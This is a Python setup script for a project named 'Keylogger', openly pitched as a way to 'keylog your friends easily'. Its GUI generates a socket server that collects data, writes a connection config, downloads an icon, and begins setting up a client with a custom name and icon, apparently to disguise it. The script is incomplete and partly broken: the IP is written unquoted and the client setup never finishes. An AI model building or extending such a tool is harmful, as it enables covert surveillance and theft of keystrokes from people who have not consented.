import os
from time import sleep
from tkinter import *
import socket
import requests
from tkinter import filedialog

global PORT_ent
global IP_ent

def setupserver():
    ServerSetup.destroy()
    ServerCode = """
import socket
from threading import Thread
from connections import HOST_IP, HOST_PORT

SERVER_HOST = HOST_IP
SERVER_PORT = HOST_PORT
separator_token = "<SEP>"

users = []

client_sockets = set()
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"Server created on {SERVER_HOST}:{SERVER_PORT}")

def listen_for_client(cs):
    while True:
        try:
            global msg
            msg = cs.recv(1024).decode()
            print(msg)
        except Exception as e:
            print(f"Error: {e}")
            client_sockets.remove(cs)
        else:
            msg = msg.replace(separator_token, ": ")
        for client_socket in client_sockets:
            client_socket.send(msg.encode())

while True:
    client_socket, client_address = s.accept()
       
    print(f"New connection from {client_address}")
    client_sockets.add(client_socket)
    t = Thread(target=listen_for_client, args=(client_socket,))
    t.daemon = True
    t.start()

for cs in client_sockets:
    cs.close()
s.close()
"""
    os.mkdir("./Keylogger")
    os.chdir("./Keylogger")
    cn = open("./connections.py", "x")
    cncontent = f"HOST_IP = {str(IP_ent.get())}\nHOST_PORT = {int(PORT_ent.get())}"
    cn.write(cncontent)
    cn.close()

    SR = open("./SERVER_RAW.py", "x")
    SR.write(ServerCode)
    SR.close()

    SI = open("./Server.ico", "wb")
    output = requests.get("https://raw.githubusercontent.com/etheboi/Keylogger/main/Server.ico", allow_redirects=True)
    SI.write(output.content)
    SI.close()
    #os.system('pyinstaller --noconfirm --onefile --console --icon "./Server.ico" --name "Server"  "./SERVER_RAW.py"')
    #os.remove("./SERVER_RAW.py")
    #os.remove("./Server.ico")

    ClientSetup = Tk()
    ClientSetup.geometry("500x300")
    ClientSetup.title("Client Setup")

    Label(ClientSetup, text="Client Setup").pack()

    Label(ClientSetup, text="\nName").pack()
    Name_ent = Entry(ClientSetup)
    Name_ent.pack()

    Label(ClientSetup, text="\nIcon").pack()
    Icon_fd = filedialog.askopenfilename(initialdir="/", title="Select A File", filetypes=(("ico files", "*.ico")))
    Icon_ent = Entry(ClientSetup)
    Icon_ent.insert(0, Icon_fd)

    ClientSetup.mainloop()


hostname = socket.gethostname()
userip = socket.gethostbyname(hostname)

print("""
$$\      $$\           $$\                                             
$$ | $\  $$ |          $$ |                                            
$$ |$$$\ $$ | $$$$$$\  $$ | $$$$$$$\  $$$$$$\  $$$$$$\$$$$\   $$$$$$\  
$$ $$ $$\$$ |$$  __$$\ $$ |$$  _____|$$  __$$\ $$  _$$  _$$\ $$  __$$\ 
$$$$  _$$$$ |$$$$$$$$ |$$ |$$ /      $$ /  $$ |$$ / $$ / $$ |$$$$$$$$ |
$$$  / \$$$ |$$   ____|$$ |$$ |      $$ |  $$ |$$ | $$ | $$ |$$   ____|
$$  /   \$$ |\$$$$$$$\ $$ |\$$$$$$$\ \$$$$$$  |$$ | $$ | $$ |\$$$$$$$\ 
\__/     \__| \_______|\__| \_______| \______/ \__| \__| \__| \_______|
""")

print("Here is where you can keylog your friends easily!")
sleep(2)
print("Server time!")
sleep(0.5)
ServerSetup = Tk()
ServerSetup.geometry("500x300")
ServerSetup.title("Server Setup")

Label(ServerSetup, text="ServerSetup").pack()

Label(ServerSetup, text="\nHost IP:").pack()
IP_ent = Entry(ServerSetup)
IP_ent.insert(0, userip)
IP_ent.pack()

Label(ServerSetup, text="\nHost PORT").pack()
PORT_ent = Entry(ServerSetup)
PORT_ent.insert(0, 22)
PORT_ent.pack()

Button(ServerSetup, text="Done", command=setupserver).pack()

ServerSetup.mainloop()